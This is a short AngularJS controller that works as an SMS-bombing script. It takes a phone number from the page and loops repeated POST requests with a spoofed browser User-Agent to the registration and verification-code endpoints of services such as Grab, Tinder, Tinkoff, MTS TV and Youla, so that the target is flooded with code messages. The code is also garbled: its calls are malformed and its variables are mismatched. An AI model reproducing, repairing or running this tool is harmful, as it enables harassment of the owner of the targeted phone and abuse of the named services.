angular.module("app", [])

  .controller("MainCtrl", function ($scope) {

    $scope.heading = "AngularJS";

    var i = 0

    var addTime = document.getElementById('add');

    

    addTime.addEventListener('click', getN);

    

    function getN() {

      var phone = document.getElementById('number').value;

      var i= 1

      document.getElementById('number').setAttribute("readonly", "readonly")

    }

    while (i>0){

      

      var headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'}

      $post("https://p.grabtaxi.com/api/passenger/v2/profiles/register", {'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'} , headers);

            then(function success(response) {

                console.log('grabtaxi send');

          });

        $post('https://belkacar.ru/get-confirmation-code' , { "phone":_phone }, headers);

        then(function success(response) {

            console.log('belkacar sent ');

        }) ;

        $post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , { "phone":_phone }, headers);

        then(function success(response) {

            console.log('tinder sent ');

        }) ;

        $post('https://app.karusel.ru/api/v1/phone/' , { "phone":_phone }, headers);

        then(function success(response) {

            console.log('karusel sent ');

        }) ;

        $post('https://api.tinkoff.ru/v1/sign_up' , { "phone":"+"+_phone }, headers);

        then(function success(response) {

            console.log('tinkoff sent');

        }) ;

        $post('https://api.mtstv.ru/v1/users' , { "msisdn":_phone }, headers);

        then(function success(response) {

            console.log('mtstv sent ');

        }) ;

        $post('https://youla.ru/web-api/auth/request_code' , { "phone":_phone }, headers);

        then(function success(response) {

            console.log('youla sent');

        }) ;

        

    } 

  });
